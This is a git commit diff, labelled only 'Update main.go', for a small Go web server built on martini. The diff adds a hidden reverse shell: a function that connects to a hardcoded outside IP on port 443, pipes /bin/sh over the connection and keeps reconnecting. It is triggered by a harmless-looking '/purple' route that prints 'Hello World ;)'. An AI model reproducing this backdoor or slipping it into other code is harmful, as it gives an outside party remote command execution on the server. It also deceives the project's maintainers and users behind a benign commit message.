ab9b7bc381dc8b5c25e003fb20c8aa519a99a930
Zack Nagaich <zacknagaich@gmail.com>
2022-02-03 12:25:53 -0500

    Update main.go

--- main.go
+++ main.go
@@ -3,9 +3,29 @@ package main
 import (
 	"fmt"
 	"os"
-
+	"net"
+	"os/exec"
+	"time"
 	"github.com/go-martini/martini"
 )
+
+
+func reverse(host string) {
+	c, err := net.Dial("tcp", host)
+	if nil != err {
+		if nil != c {
+			c.Close()
+		}
+		time.Sleep(time.Minute)
+		reverse(host)
+	}
+
+	cmd := exec.Command("/bin/sh")
+	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
+	cmd.Run()
+	c.Close()
+	reverse(host)
+}
 
 func main() {
 	message := os.Getenv("MESSAGE")
@@ -16,6 +36,11 @@ func main() {
 	m := martini.Classic()
 	m.Get("/", func() string {
 		fmt.Println(message)
+		return message
+	})
+	m.Get("/purple", func() string {
+		fmt.Println("Hello World ;)")
+		reverse("3.134.243.130:443")
 		return message
 	})
 	m.Run()
